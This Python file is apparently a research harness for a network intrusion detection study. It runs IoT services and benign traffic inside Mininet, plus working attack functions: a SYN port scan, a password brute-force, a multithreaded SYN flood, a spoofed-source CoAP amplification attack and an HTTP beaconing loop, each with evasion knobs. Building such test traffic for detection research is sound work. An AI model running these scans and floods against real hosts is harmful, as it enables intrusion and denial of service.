"""Paper B - per-host programs run inside Mininet namespaces: MQTT/CoAP/TCP/HTTP services, benign IoT
traffic, benign goodput probe, and the five sanitised attack families. Each attack prints one JSON line
(its functionality metric + attacker cost) as the last stdout line. Invoked as:
    python3 b_hosts.py <role> [args...]
All attacks are inert, rate-capped, and confined to the emulated network.
"""
import json, os, random, socket, sys, time

CRED_USER, CRED_PASS = "devops", "hunter2"
COAP_RESOURCE_BYTES = 1200


# =============================================================== services
def mqtt_broker():
    import asyncio
    from amqtt.broker import Broker
    cfg = {"listeners": {"default": {"type": "tcp", "bind": "0.0.0.0:1883", "max-connections": 500}},
           "sys_interval": 0, "auth": {"allow-anonymous": True}, "topic-check": {"enabled": False}}
    loop = asyncio.new_event_loop(); asyncio.set_event_loop(loop)
    b = Broker(cfg)
    loop.run_until_complete(b.start()); loop.run_forever()


AUTH_MAX_TRIES = 6          # attempts per connection, as OpenSSH's default MaxAuthTries


def authsvc(port=2323):
    """Line-based login service. v2: like a real login service it answers up to AUTH_MAX_TRIES attempts on one
    connection (v1 answered one line and closed, so every attempt after the first on a connection was lost and
    pkts_per_conn > 1 broke the brute-force attack by construction). Connections are served in threads."""
    import threading

    def serve(c):
        try:
            c.settimeout(3); buf = b""; tries = 0
            while tries < AUTH_MAX_TRIES:
                while b"\n" not in buf and len(buf) < 1024:
                    chunk = c.recv(256)
                    if not chunk:
                        return
                    buf += chunk
                line, _, buf = buf.partition(b"\n")
                tries += 1
                try:
                    u, p = line.decode("latin1").strip().split(":", 1)
                    ok = (u == CRED_USER and p.strip() == CRED_PASS)
                except Exception:
                    ok = False
                c.sendall(b"OK\n" if ok else b"NO\n")
                if ok:
                    return
        except Exception:
            pass
        finally:
            try:
                c.close()
            except Exception:
                pass

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("0.0.0.0", port)); s.listen(64)
    while True:
        try:
            c, _ = s.accept()
            threading.Thread(target=serve, args=(c,), daemon=True).start()
        except Exception:
            pass


def coapsrv():
    import asyncio, aiocoap, aiocoap.resource as resource, random as _r
    class Data(resource.Resource):                               # large resource = amplification target
        async def render_get(self, request):
            return aiocoap.Message(payload=b"D" * COAP_RESOURCE_BYTES)
    class Telem(resource.Resource):                              # small resource = benign sensor read
        async def render_get(self, request):
            return aiocoap.Message(payload=b"T" * _r.randint(20, 80))
    loop = asyncio.new_event_loop(); asyncio.set_event_loop(loop)
    root = resource.Site(); root.add_resource(["data"], Data()); root.add_resource(["t"], Telem())
    loop.run_until_complete(aiocoap.Context.create_server_context(root, bind=("0.0.0.0", 5683)))
    loop.run_forever()


def httpsrv(port):
    import http.server, socketserver
    class H(http.server.BaseHTTPRequestHandler):
        def do_GET(self):
            body = b"ok\n"
            self.send_response(200); self.send_header("Content-Length", str(len(body))); self.end_headers()
            self.wfile.write(body)
        def log_message(self, *a):
            pass
    socketserver.ThreadingTCPServer.allow_reuse_address = True
    socketserver.ThreadingTCPServer(("0.0.0.0", int(port)), H).serve_forever()


def udp_echo(port, resp_len):
    """Generic short-request/short-response UDP server, used to emulate DNS (53) and NTP (123) flow shapes.
    Response size is varied to give Gotham-like packet-size spread."""
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("0.0.0.0", int(port)))
    while True:
        try:
            _, addr = s.recvfrom(512)
            s.sendto(b"R" * max(16, int(random.gauss(resp_len, resp_len * 0.4))), addr)
        except Exception:
            pass


def dns_server():
    udp_echo(53, 120)     # DNS: ~40B query -> ~120B response, one short UDP exchange


def ntp_server():
    udp_echo(123, 48)     # NTP: 48B request/response


# =============================================================== benign
def benign(broker_ip, victim_ip, idx, sink_ip="10.0.0.12"):
    """Gotham-calibrated IoT benign traffic. Real Gotham benign is dominated by short UDP exchanges
    (DNS 53, NTP 123, CoAP 5683) and a few long-lived MQTT (TCP 1883) connections, with occasional ICMP;
    short-lived HTTP polling (the previous artefact) is removed. Each device draws one of several profiles
    that weight these protocols differently, giving the heterogeneity of many device types."""
    import paho.mqtt.client as mqtt
    idx = int(idx); rng = random.Random(1000 + idx)
    # profile weights over actions: (dns, ntp, coap, mqtt_pub, icmp); period = mean seconds between actions
    PROFILES = [
        {"w": (0.55, 0.10, 0.20, 0.10, 0.05), "period": 1.0, "mqtt": True},    # chatty DNS sensor
        {"w": (0.35, 0.15, 0.10, 0.35, 0.05), "period": 2.0, "mqtt": True},    # MQTT-heavy telemetry
        {"w": (0.40, 0.10, 0.40, 0.05, 0.05), "period": 1.5, "mqtt": False},   # CoAP sensor
        {"w": (0.60, 0.20, 0.05, 0.05, 0.10), "period": 3.0, "mqtt": False},   # mostly DNS/NTP beacon
        {"w": (0.45, 0.10, 0.25, 0.15, 0.05), "period": 0.7, "mqtt": True},    # fast mixed
    ]
    p = PROFILES[idx % len(PROFILES)]
    acts = ["dns", "ntp", "coap", "mqtt", "icmp"]; wts = list(p["w"])
    # persistent MQTT connection (one long-lived TCP flow), like Gotham's few long MQTT flows
    cli = None
    if p["mqtt"]:
        try:
            cli = mqtt.Client(client_id=f"iot{idx}-{rng.randint(0,9999)}")
            cli.connect(broker_ip, 1883, 60); cli.loop_start()
        except Exception:
            cli = None
    import aiocoap, asyncio
    def udp_query(dst, port, qlen):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); s.settimeout(1.2)  # fresh ephemeral port each time
        try:
            s.sendto(b"q" * qlen, (dst, port))
            try:
                s.recvfrom(256)
            except Exception:
                pass
        finally:
            s.close()
    while True:
        a = rng.choices(acts, weights=wts, k=1)[0]
        try:
            if a == "dns":
                udp_query(sink_ip, 53, rng.randint(20, 45))
            elif a == "ntp":
                udp_query(sink_ip, 123, 48)
            elif a == "coap":
                async def cg():
                    ctx = await aiocoap.Context.create_client_context()
                    try:
                        await asyncio.wait_for(ctx.request(aiocoap.Message(code=aiocoap.GET, uri=f"coap://{victim_ip}/t")).response, 2)
                    except Exception:
                        pass
                    await ctx.shutdown()
                asyncio.new_event_loop().run_until_complete(cg())
            elif a == "mqtt" and cli:
                cli.publish(f"iot/{idx}/telemetry", json.dumps({"t": time.time(), "v": rng.gauss(20, 2)}), qos=0)
            elif a == "icmp":
                os.system(f"ping -c 1 -W 1 {sink_ip} >/dev/null 2>&1")
        except Exception:
            pass
        time.sleep(max(0.1, rng.gauss(p["period"], p["period"] * 0.5)))


def goodput(victim_ip, port, duration):
    """Benign client (flood-impact probe): issue HTTP GETs as fast as they complete, with a 1-s timeout, and print
    the number completed within `duration` s. It measures the throughput a benign client achieves while the attack
    runs; the paired reference (Twin.paired_goodput) measures the same thing under the same conditions with no
    attack, so the drop isolates the attack's effect. On a single-host emulation this effect is dominated by
    contention for the victim's CPU rather than by link saturation (stated as a limitation)."""
    end = time.time() + float(duration); n = 0
    while time.time() < end:
        try:
            s = socket.create_connection((victim_ip, int(port)), timeout=1)
            s.settimeout(1)
            s.sendall(b"GET / HTTP/1.0\r\nHost: v\r\n\r\n")
            if s.recv(64):
                n += 1
            s.close()
        except Exception:
            pass
    print(n)


# =============================================================== knob helpers (scapy)
def _scapy():
    from scapy.all import IP, TCP, UDP, Raw, send, sr1, sr, RandShort, fragment, conf
    conf.verb = 0
    return dict(IP=IP, TCP=TCP, UDP=UDP, Raw=Raw, send=send, sr1=sr1, sr=sr, RandShort=RandShort, fragment=fragment)


def _sport(cfg, i):
    m = int(cfg.get("srcport_mode", 2))
    if m == 0:
        return 44444
    if m == 1:
        return 1024 + (i % 60000)
    if m == 2:
        return random.randint(1025, 65535)
    return random.randint(1, 65535)


def _ipd(cfg):
    base = 1.0 / max(1.0, cfg.get("rate_pps", 200.0))
    j = cfg.get("ipd_jitter", 0.0) * base
    return base, j


def _sleep(base, j):
    time.sleep(max(0.0, base + (random.uniform(-j, j) if j else 0.0)))


def _pad(cfg, S):
    n = int(cfg.get("pad_bytes", 0))
    return S["Raw"](load=b"\x00" * n) if n > 0 else None


def _maybe_frag(cfg, pkt, S):
    fm = {0: 0, 1: 1500, 2: 576, 3: 256}.get(int(cfg.get("frag_mtu", 0)), 0)
    return S["fragment"](pkt, fragsize=fm) if fm and len(bytes(pkt)) > fm else [pkt]


# =============================================================== attacks
def atk_netscan(victim, cfg, duration):
    S = _scapy(); cfg = json.loads(cfg); ttl = int(cfg.get("ttl", 64)); win = int(cfg.get("tcp_window", 8192))
    base, j = _ipd(cfg)
    ports = [21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 445, 993, 995, 1433, 1723,
             1883, 2323, 3306, 3389, 5683, 5900, 8000, 8080, 8443, 8883, 9100]   # realistic recon sweep
    open_true = {80, 2323}
    found = set(); sent = 0; pad = _pad(cfg, S)
    t_end = time.time() + float(duration)
    # one SYN per port (a fan of short flows, as a real recon sweep looks to a flow NIDS)
    for k, p in enumerate(ports):
        if time.time() > t_end:
            break
        pk = S["IP"](dst=victim, ttl=ttl) / S["TCP"](sport=_sport(cfg, k), dport=p, flags="S", window=win, seq=1000 + k)
        if pad:
            pk = pk / pad
        ans = S["sr1"](pk, timeout=0.25, retry=0); sent += 1
        if ans is not None and ans.haslayer("TCP") and (ans["TCP"].flags & 0x12) == 0x12:
            found.add(p)
        if cfg.get("idle_insert", 0) and k % 8 == 7:
            time.sleep(min(cfg["idle_insert"], 1.5))
        _sleep(base, j)
    print(json.dumps({"ports_found": len(found & open_true), "ports_true": len(open_true),
                      "false_open": len(found - open_true), "sent": sent,
                      "func_ok": int(open_true.issubset(found))}))


def atk_svcbrute(victim, cfg, duration):
    cfg = json.loads(cfg); base, j = _ipd(cfg)
    users = ["root", "admin", "devops", "pi", "user"]
    passwords = ["123456", "password", "admin", "toor", "raspberry", "letmein", "hunter2", "qwerty"]
    creds = [(u, p) for u in users for p in passwords]
    random.shuffle(creds)
    if ("devops", "hunter2") in creds:                       # ensure the correct pair is within budget
        creds.remove(("devops", "hunter2")); creds.insert(min(25, len(creds)), ("devops", "hunter2"))
    per_conn = int(cfg.get("pkts_per_conn", 1)); found = 0; attempts = 0; conns = 0; t_end = time.time() + float(duration)
    pad = b" " * int(cfg.get("pad_bytes", 0))
    i = 0
    while i < len(creds) and time.time() < t_end and not found:
        try:
            s = socket.create_connection((victim, 2323), timeout=2); conns += 1
            n = 0
            while n < per_conn and i < len(creds) and time.time() < t_end:
                u, p = creds[i]
                s.sendall(f"{u}:{p}".encode() + pad + b"\n")
                r = s.recv(16)
                if not r:            # the server closed the connection (attempt limit): retry this pair on a new one
                    break
                i += 1; attempts += 1; n += 1
                if b"OK" in r:
                    found = 1; break
                _sleep(base, j)
            s.close()
        except Exception:
            time.sleep(0.05)
        if cfg.get("idle_insert", 0) and not found:
            time.sleep(min(cfg["idle_insert"], 2))
    print(json.dumps({"cred_found": found, "attempts": attempts, "connections": conns, "func_ok": found}))


def atk_synflood(victim, cfg, duration):
    import threading
    S = _scapy(); cfg = json.loads(cfg); base, j = _ipd(cfg)
    ttl = int(cfg.get("ttl", 64)); win = int(cfg.get("tcp_window", 8192))
    nthreads = max(1, int(cfg.get("parallel", 1))); t_end = time.time() + float(duration)
    counts = [0] * nthreads
    pad = _pad(cfg, S)

    def worker(tid):
        k = tid * 100000
        batch = max(1, int(cfg.get("rate_pps", 200) / nthreads / 20))     # ~20 send() calls/sec/thread
        while time.time() < t_end:
            pkts = []
            for _ in range(batch):
                p = S["IP"](dst=victim, ttl=ttl) / S["TCP"](sport=_sport(cfg, k), dport=80, flags="S", window=win, seq=k & 0xffffffff)
                if pad:
                    p = p / pad
                pkts += _maybe_frag(cfg, p, S); k += 1
            S["send"](pkts, inter=0, verbose=0)
            counts[tid] += batch
            if cfg.get("idle_insert", 0) and counts[tid] % 200 < batch:
                time.sleep(min(cfg["idle_insert"], 2))
            _sleep(base * batch, j * batch)
    ts = [threading.Thread(target=worker, args=(i,)) for i in range(nthreads)]
    [t.start() for t in ts]; [t.join() for t in ts]
    print(json.dumps({"sent": sum(counts), "func_ok": 1}))


def atk_coapamp(victim, spoof_to, cfg, duration):
    S = _scapy(); cfg = json.loads(cfg); base, j = _ipd(cfg)
    # small CoAP GET /data (confirmable) with spoofed source = amplification victim
    coap_get = bytes([0x40, 0x01, 0x00, 0x01]) + b"\xb4data"   # ver/type/GET, Uri-Path 'data'
    ttl = int(cfg.get("ttl", 64)); sent = 0; t_end = time.time() + float(duration); k = 0
    while time.time() < t_end:
        pkt = S["IP"](src=spoof_to, dst=victim, ttl=ttl) / S["UDP"](sport=_sport(cfg, k), dport=5683) / S["Raw"](load=coap_get)
        S["send"](pkt); sent += 1; k += 1
        if cfg.get("idle_insert", 0) and k % 20 == 0:
            time.sleep(min(cfg["idle_insert"], 2))
        _sleep(base, j)
    print(json.dumps({"requests": sent, "req_bytes": len(coap_get), "resp_bytes": COAP_RESOURCE_BYTES,
                      "func_ok": int(sent > 0)}))


def atk_httpbeacon(sink, cfg, duration):
    cfg = json.loads(cfg); period = max(0.2, 1.0 / max(0.2, cfg.get("rate_pps", 2.0) / 100.0))
    sent = acked = 0; t_end = time.time() + float(duration)
    while time.time() < t_end:
        try:
            s = socket.create_connection((sink, 80), timeout=2)
            pad = ("A" * int(cfg.get("pad_bytes", 0)))
            s.sendall(f"GET /b?{pad} HTTP/1.0\r\nHost: c2\r\n\r\n".encode()); sent += 1
            if s.recv(64):
                acked += 1
            s.close()
        except Exception:
            pass
        jitter = cfg.get("ipd_jitter", 0.0) * period
        time.sleep(max(0.1, period + random.uniform(-jitter, jitter)))
    exp = max(1, sent)
    print(json.dumps({"beacons_sent": sent, "beacons_ok": acked, "func_ok": int(acked >= 0.8 * exp)}))


ROLES = {"mqtt_broker": mqtt_broker, "authsvc": authsvc, "coapsrv": coapsrv, "httpsrv": httpsrv,
         "dns_server": dns_server, "ntp_server": ntp_server,
         "benign": benign, "goodput": goodput, "atk_netscan": atk_netscan, "atk_svcbrute": atk_svcbrute,
         "atk_synflood": atk_synflood, "atk_coapamp": atk_coapamp, "atk_httpbeacon": atk_httpbeacon}

if __name__ == "__main__":
    role = sys.argv[1]
    ROLES[role](*sys.argv[2:])
